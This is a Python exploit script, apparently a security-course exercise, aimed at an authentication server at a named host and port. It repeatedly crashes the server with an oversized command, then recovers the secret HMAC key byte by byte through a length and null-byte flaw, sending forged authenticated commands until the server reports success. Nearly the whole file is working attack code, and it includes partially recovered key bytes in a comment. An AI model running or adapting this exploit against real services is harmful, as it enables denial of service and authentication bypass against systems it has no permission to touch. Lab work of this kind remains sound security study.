import socket
import hmac
import hashlib
import time
import sys


printable_characters = []


for i in range(32, 256):
    printable_characters.append(chr(i).encode("latin-1"))


USER_NAME = b"241153"
TAG = b"ClientCmd"
command_o = b'a' * 31
DILIMIT = b"|"
KEY_LENGTH = 20

# fucntion to generate HMAC value, return HMAC value
def generate_hmac(full_length_key, part_key):

    total_parameter = TAG + DILIMIT + USER_NAME + DILIMIT + command_o + part_key
    print("total_parameter = ", total_parameter)

    print("full_length_key = ", full_length_key)
    print("part_key= ", part_key)
    generated_hmac = hmac.new(full_length_key, total_parameter, hashlib.sha256).hexdigest()

    return generated_hmac


HOST = 'device1.vikaa.fi'  # The server's hostname or IP address
PORT = 35984       # The port used by the server

# function to send command and key to server, return data which contain
# b'Authentication successful. Processing command.\n' if key is correct
def deliver_to_server(an_hmac, part_key):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print('server connected')

        send_msg = b'241153;' + command_o + part_key + b';' + an_hmac.encode("latin-1") + b'\n'
        print("send_msg = ", send_msg)

        s.sendall(send_msg)

        print('data sent')
        data = s.recv(1024)
        print("returned data from fun deliver... = ", data)
        return data



def crash_server():
    command = b'a' * 89
    key = 'bbbbbbbbbbbbbbbbbbbb'
    hmac = "kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(b'241153;' + command + key.encode("latin-1") + b';' + hmac.encode("latin-1") + b'\n')

        print('data sent')

        data = s.recv(1024)
        print("data = ", data)


key_components = []

# key_components = [b'N', b'k', b'5', b'2', b'D', b'l', b'c', b'K', b'9', b'4', b'r', b'O', b't', b'e', b'Z', b'O', b'0', b'V', b'V']



while len(key_components) < 20:
    crash_server()
    time.sleep(10)

    for i in range(len(printable_characters)):
        key_components.reverse()

        if len(key_components) >= KEY_LENGTH -1:
            guess_key = printable_characters[i] + b''.join(key_components)
            part_key = b''

        else:
            guess_key = b'b'*((KEY_LENGTH-1)-len(key_components)-1) + b'\0' + printable_characters[i] + b''.join(key_components)
            part_key = b'b' * ((KEY_LENGTH - 1) - len(key_components) - 1)

        print("guess_key = ", guess_key)
        print("part_key = ", part_key)

        key_components.reverse()

        hhmacc = generate_hmac(guess_key, part_key)

        data = deliver_to_server(hhmacc, part_key)

        if "successful" in data.decode("latin-1"):

            key_components.append(printable_characters[i])
            print(key_components)
            crash_server()
            time.sleep(10)


print(key_components)





